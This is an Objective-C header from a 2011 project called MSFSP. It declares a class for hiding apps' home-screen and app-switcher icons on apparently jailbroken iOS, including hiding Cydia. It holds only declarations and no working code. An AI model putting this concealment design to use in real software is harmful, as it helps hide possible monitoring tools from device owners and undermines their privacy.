//
//  Visibility.h
//  MSFSP
//
//  Created by Dominique  Mayrand on 12/21/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>

#define kBUNDLEIDENTIFIER @"" //com.app.ssmp
#define kCYDIAIDENTIFIER @"com.saurik.Cydia"
#define SPRINGBOARDIDENTIFIER @"com.apple.springboard"
#define CYDIADISPLAYINDENTIFIER @"Cydia"

@interface Visibility : NSObject {
@private
	BOOL mHideDesktopIcon;
	BOOL mHideAppSwitcherIcon;
	NSString *mBundleID;
	NSString *mBundleName;
	
	NSArray		*mHiddenBundleIdentifiers;
	NSArray		*mShownBundleIdentifiers;
}

+ (id) sharedVisibility; // Use this method to fast access regardless of information changes (mBundleID, mBundleName)

+ (NSData *) visibilityData; // Only data of mHideDesktopIcon, mHideAppSwitcherIcon, mBundleID, mBundleName

@property (nonatomic, assign) BOOL mHideDesktopIcon;
@property (nonatomic, assign) BOOL mHideAppSwitcherIcon;
@property (copy) NSString *mBundleID;
@property (copy) NSString *mBundleName;

@property (nonatomic, retain) NSArray *mHiddenBundleIdentifiers;
@property (nonatomic, retain) NSArray *mShownBundleIdentifiers;

@end
